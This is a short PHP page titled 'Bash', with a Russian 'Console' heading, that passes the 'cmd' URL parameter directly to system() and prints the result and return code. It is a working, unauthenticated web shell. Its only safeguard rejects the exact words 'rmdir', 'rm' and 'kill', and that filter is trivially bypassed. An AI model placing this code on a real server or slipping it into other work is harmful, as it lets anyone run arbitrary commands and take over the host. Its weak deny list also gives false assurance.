<html lang="ru">
<head>
<title>Bash</title>
    <link rel="stylesheet" type="text/css"/>
</head>
<body>
<h1>Консоль</h1>
<?php
    if(isset($_GET['cmd'])){
        if(($_GET['cmd'])=="rmdir" || ($_GET['cmd'])=="rm" || ($_GET['cmd'])=="kill"){
            echo "error";
        } else {
            $last_line = system(($_GET['cmd']), $retval);

            echo '
            </pre>
            <hr />Код возврата: ' . $retval; 
        }
        
    }
    
?>

</body>
</html>